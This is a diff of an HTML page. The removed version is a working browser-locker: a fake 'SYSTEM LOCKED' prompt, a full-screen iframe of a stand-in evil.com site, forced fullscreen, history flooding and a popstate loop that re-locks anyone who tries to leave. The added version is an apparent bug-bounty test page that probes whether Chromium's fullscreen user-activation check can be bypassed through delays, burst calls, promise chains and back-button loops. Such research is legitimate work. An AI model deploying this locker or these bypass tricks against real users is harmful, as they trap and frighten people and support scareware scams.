@@ -2,86 +2,84 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Research - Full Hijack</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VRP Research Lab - Activation Leak</title>
     <style>
-        /* Memastikan tidak ada celah di pinggir layar */
-        html, body { 
-            margin: 0; padding: 0; width: 100%; height: 100%; 
-            overflow: hidden; background: #000; 
+        body { background: #121212; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
+        .test-btn { 
+            display: block; width: 80%; margin: 10px auto; padding: 15px; 
+            background: #333; color: #fff; border: 1px solid #555; cursor: pointer;
         }
-        
-        /* IFRAME: Paksa ukuran penuh 100vw dan 100vh */
-        #evilHost {
-            position: absolute; top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            border: none; display: none; z-index: 9999;
-            background: white;
-        }
-
-        .start-page {
-            display: flex; flex-direction: column; align-items: center;
-            justify-content: center; height: 100vh; color: white;
-        }
-        .btn-start {
-            padding: 25px 50px; background: #d93025; color: white;
-            border: none; border-radius: 10px; font-weight: bold;
-            font-size: 1.2rem; box-shadow: 0 5px 15px rgba(217,48,37,0.4);
-        }
+        .status { margin-top: 20px; color: yellow; border: 1px solid #444; padding: 10px; min-height: 50px; }
     </style>
 </head>
 <body>
 
-    <div class="start-page" id="gate">
-        <h1 style="color: #ff4d4d;">⚠ SYSTEM LOCKED</h1>
-        <p>Interaksi diperlukan untuk sinkronisasi keamanan.</p>
-        <button class="btn-start" onclick="enterThePrison()">SINKRONISASI SEKARANG</button>
-    </div>
+    <h2>🔬 Activation Leak Test Lab</h2>
+    <p>Target: Chromium Activation Model</p>
 
-    <iframe id="evilHost" src="https://www.evil.com"></iframe>
+    <button class="test-btn" onclick="test1()">🔥 TEST 1: 2s Async Delay</button>
+    <button class="test-btn" onclick="test2()">🔥 TEST 2: Multiple Burst Calls</button>
+    <button class="test-btn" onclick="test3()">🔥 TEST 3: Promise Chain (Microtask)</button>
+    <button class="test-btn" onclick="test4()">🔥 TEST 4: Single Alert Persistence</button>
+
+    <div class="status" id="statusBox">Status: Waiting for interaction...</div>
 
     <script>
-        const iframe = document.getElementById('evilHost');
-        const gate = document.getElementById('gate');
         const el = document.documentElement;
+        const log = (msg) => document.getElementById('statusBox').innerText = "Status: " + msg;
 
-        function enterThePrison() {
-            // 1. Tampilkan Iframe
-            gate.style.display = "none";
-            iframe.style.display = "block";
-
-            // 2. PAKSA FULLSCREEN
-            if (el.requestFullscreen) {
-                el.requestFullscreen().catch(err => {
-                    console.log("Gagal Fullscreen: " + err.message);
-                });
-            }
-
-            // 3. HISTORY BOMB (Kunci navigasi)
-            for (let i = 0; i < 100; i++) {
-                window.history.pushState({p: i}, "", "?session_id=" + Math.random().toString(36).substring(7));
-            }
-
-            alert("Sistem Berhasil Disinkronisasi. Navigasi dikunci demi keamanan.");
+        // TEST 1: Apakah 'User Activation' bocor setelah delay lama?
+        function test1() {
+            alert("Test 1: Menunggu 2 detik setelah OK...");
+            setTimeout(() => {
+                el.requestFullscreen()
+                    .then(() => log("SUCCESS: Activation LEAKED after 2s delay! (VALID BUG)"))
+                    .catch(e => log("FAILED: Activation expired (Intended)"));
+            }, 2000);
         }
 
-        // 4. THE ESCAPE BLOCKER (The Re-Lock Loop)
-        window.onpopstate = function() {
-            if (navigator.vibrate) navigator.vibrate(200);
-
-            // Munculkan Alert untuk mendapatkan 'User Gesture' baru
-            alert("⚠️ PERINGATAN KEAMANAN:\nUpaya keluar terdeteksi. Klik OK untuk mengunci kembali sesi.");
-
-            // Gunakan interaksi OK tadi untuk masuk Fullscreen lagi
+        // TEST 2: Apakah bisa memanggil API sensitif berkali-kali (Burst)?
+        function test2() {
+            alert("Test 2: Mencoba Multiple Burst...");
             setTimeout(() => {
-                if (el.requestFullscreen) el.requestFullscreen();
+                let successCount = 0;
+                const tryFS = () => el.requestFullscreen().then(() => successCount++);
                 
-                // Tambah history lagi agar user makin jauh dari halaman asli
-                for (let i = 0; i < 10; i++) {
-                    window.history.pushState(null, "", "?secure_relock=" + Date.now());
-                }
+                tryFS(); tryFS(); tryFS();
+                
+                setTimeout(() => {
+                    log(`Burst Result: ${successCount} calls successful.`);
+                    if(successCount > 1) alert("Bypass Detected: Multiple FS calls allowed!");
+                }, 500);
             }, 50);
-        };
+        }
+
+        // TEST 3: Apakah Microtask (Promise) bisa mengecoh guard?
+        function test3() {
+            alert("Test 3: Promise Microtask Test...");
+            Promise.resolve().then(() => {
+                el.requestFullscreen()
+                    .then(() => log("SUCCESS: Promise Chain Bypass! (VALID BUG)"))
+                    .catch(e => log("FAILED: Promise guard active (Intended)"));
+            });
+        }
+
+        // TEST 4: Single Alert Persistence (The Loop)
+        function test4() {
+            alert("Test 4: Klik OK sekali, lalu tekan BACK sistem berkali-kali.");
+            window.history.pushState({p:1}, "", "");
+            
+            window.onpopstate = function() {
+                // Mencoba FS tanpa alert baru di sini
+                el.requestFullscreen()
+                    .then(() => log("SUCCESS: Loop Re-lock without new Alert! (CRITICAL)"))
+                    .catch(e => {
+                        log("FAILED: Needs new Alert to re-activate.");
+                        // Jika gagal, ini membuktikan hipotesis ke-7 kamu benar.
+                    });
+            };
+        }
     </script>
 </body>
 </html>
